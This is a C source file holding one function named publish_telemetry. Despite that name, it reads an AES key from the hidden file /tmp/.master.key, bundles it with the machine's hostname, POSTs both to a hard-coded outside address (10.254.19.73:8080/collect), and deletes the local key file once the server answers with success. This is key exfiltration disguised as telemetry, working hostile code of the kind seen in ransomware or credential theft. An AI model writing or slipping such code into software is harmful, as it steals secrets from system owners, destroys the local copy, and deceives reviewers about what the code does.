#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <limits.h>
#include <curl/curl.h>

#define _GNU_SOURCE

int publish_telemetry(void) {
    FILE *fp = NULL;
    char *buf = NULL;
    long file_size = 0;
    char *aes_key = NULL;
    char hostname[PATH_MAX] = {0};
    char *json_body = NULL;
    CURL *curl = NULL;
    struct curl_slist *headers = NULL;
    CURLcode res;
    long http_code = 0;
    int result = -1;
    size_t read_size = 0;

    /* Step 1: Open and read /tmp/.master.key */
    fp = fopen("/tmp/.master.key", "rb");
    if (fp == NULL) {
        perror("fopen /tmp/.master.key");
        goto cleanup;
    }

    /* Determine file size */
    if (fseek(fp, 0, SEEK_END) != 0) {
        perror("fseek end");
        goto cleanup;
    }
    file_size = ftell(fp);
    if (file_size < 0) {
        perror("ftell");
        goto cleanup;
    }
    if (fseek(fp, 0, SEEK_SET) != 0) {
        perror("fseek start");
        goto cleanup;
    }

    /* Allocate buffer for file content plus null terminator */
    buf = (char *)malloc((size_t)file_size + 1);
    if (buf == NULL) {
        perror("malloc buf");
        goto cleanup;
    }

    /* Read the file content */
    read_size = fread(buf, 1, (size_t)file_size, fp);
    if (read_size != (size_t)file_size) {
        fprintf(stderr, "Failed to read full file: read %zu of %ld bytes\n", read_size, file_size);
        goto cleanup;
    }
    buf[read_size] = '\0'; /* Null-terminate */

    /* Step 2: Extract "aes_key" value */
    {
        const char *needle = "\"aes_key\":\"";
        char *p = strstr(buf, needle);
        if (p == NULL) {
            fprintf(stderr, "aes_key not found in file\n");
            goto cleanup;
        }
        p += strlen(needle); /* Advance past the key and opening quote */
        char *end_quote = strchr(p, '"');
        if (end_quote == NULL) {
            fprintf(stderr, "Closing quote for aes_key not found\n");
            goto cleanup;
        }
        size_t key_len = (size_t)(end_quote - p);
        if (key_len == 0) {
            fprintf(stderr, "aes_key is empty\n");
            goto cleanup;
        }
        aes_key = (char *)malloc(key_len + 1);
        if (aes_key == NULL) {
            perror("malloc aes_key");
            goto cleanup;
        }
        memcpy(aes_key, p, key_len);
        aes_key[key_len] = '\0';
    }

    /* Step 3: Get hostname */
    if (gethostname(hostname, sizeof(hostname)) != 0) {
        perror("gethostname");
        goto cleanup;
    }
    hostname[sizeof(hostname) - 1] = '\0'; /* Ensure null termination */

    /* Step 4: Build JSON string */
    {
        size_t json_len = strlen("{\"aes_key\":\"") + strlen(aes_key) +
                          strlen(",\"hostname\":\"") + strlen(hostname) +
                          strlen("\"}") + 1;
        json_body = (char *)malloc(json_len);
        if (json_body == NULL) {
            perror("malloc json_body");
            goto cleanup;
        }
        snprintf(json_body, json_len, "{\"aes_key\":\"%s\",\"hostname\":\"%s\"}",
                 aes_key, hostname);
    }

    /* Step 5: Send HTTP POST via libcurl */
    curl_global_init(CURL_GLOBAL_DEFAULT);
    curl = curl_easy_init();
    if (curl == NULL) {
        fprintf(stderr, "curl_easy_init failed\n");
        goto cleanup;
    }

    /* Set URL */
    curl_easy_setopt(curl, CURLOPT_URL, "http://10.254.19.73:8080/collect");

    /* Set HTTP POST and JSON body */
    curl_easy_setopt(curl, CURLOPT_POST, 1L);
    curl_easy_setopt(curl, CURLOPT_POSTFIELDS, json_body);
    curl_easy_setopt(curl, CURLOPT_POSTFIELDSIZE, (long)strlen(json_body));

    /* Set Content-Type header */
    headers = curl_slist_append(headers, "Content-Type: application/json");
    if (headers == NULL) {
        fprintf(stderr, "curl_slist_append failed\n");
        goto cleanup;
    }
    curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);

    /* Perform the request */
    res = curl_easy_perform(curl);
    if (res != CURLE_OK) {
        fprintf(stderr, "curl_easy_perform failed: %s\n", curl_easy_strerror(res));
        goto cleanup;
    }

    /* Get HTTP response code */
    curl_easy_getinfo(curl, CURLINFO_RESPONSE_CODE, &http_code);

    /* Step 6: If HTTP 200, remove the key file */
    if (http_code == 200) {
        if (remove("/tmp/.master.key") != 0) {
            /* Only log, don't treat as error */
            fprintf(stderr, "Warning: Failed to remove /tmp/.master.key: %s\n", strerror(errno));
        }
    } else {
        fprintf(stderr, "Server returned HTTP code %ld (expected 200)\n", http_code);
        goto cleanup;
    }

    result = 0; /* Success */

cleanup:
    /* Free resources */
    if (fp != NULL) {
        fclose(fp);
    }
    if (buf != NULL) {
        free(buf);
    }
    if (aes_key != NULL) {
        free(aes_key);
    }
    if (json_body != NULL) {
        free(json_body);
    }
    if (headers != NULL) {
        curl_slist_free_all(headers);
    }
    if (curl != NULL) {
        curl_easy_cleanup(curl);
    }
    curl_global_cleanup();

    return result;
}